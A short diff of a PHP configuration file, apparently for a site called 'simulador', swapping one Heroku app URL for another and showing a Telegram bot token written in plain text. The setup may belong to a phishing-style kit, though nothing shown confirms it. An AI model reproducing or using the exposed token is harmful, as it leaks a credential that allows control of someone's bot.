@@ -2,7 +2,7 @@
 
 // URL del sitio donde fue subido (sin barra final)
 // Ejemplo: https://midominio.com/simulador
-$site_url = "https://av01-c6275892621a.herokuapp.com/simulador";
+$site_url = "https://avav-25091ebc4e4c.herokuapp.com/simulador/";
 
 // Telegram Bot Configuration
 $token = "8910530226:AAFkjqMoTQQ90AZIQU5paJLG32HTOo3MYng";
